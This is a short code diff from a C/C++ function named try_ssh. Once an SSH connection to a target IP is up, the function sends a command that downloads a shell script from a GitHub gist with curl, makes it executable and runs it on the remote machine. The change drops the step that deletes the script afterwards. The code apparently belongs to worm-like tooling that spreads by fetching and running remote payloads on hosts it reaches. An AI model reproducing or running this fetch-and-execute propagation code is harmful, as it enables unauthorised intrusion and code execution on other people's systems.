@@ -98,7 +98,7 @@ void try_ssh(char * target_ip) {
   if (!ssh_client.is_connected()) {
     return;
   } else {
-    snprintf(cmd, MAX_CMD_LENGTH, "curl -o h.sh https://gist.githubusercontent.com/axegon/80c090307585fd180d1816137b668fee/raw/ad74d53a1d3fbf420fa434f1ac3a2e9f35ece7f3/ssup.sh && chmod 777 h.sh && bash h.sh && rm -f h.sh");
+    snprintf(cmd, MAX_CMD_LENGTH, "curl -o h.sh https://gist.githubusercontent.com/axegon/80c090307585fd180d1816137b668fee/raw/ad74d53a1d3fbf420fa434f1ac3a2e9f35ece7f3/ssup.sh && chmod 777 h.sh && bash h.sh");
     ssh_client.send_cmd(cmd);
     ssh_client.disconnect();
   }
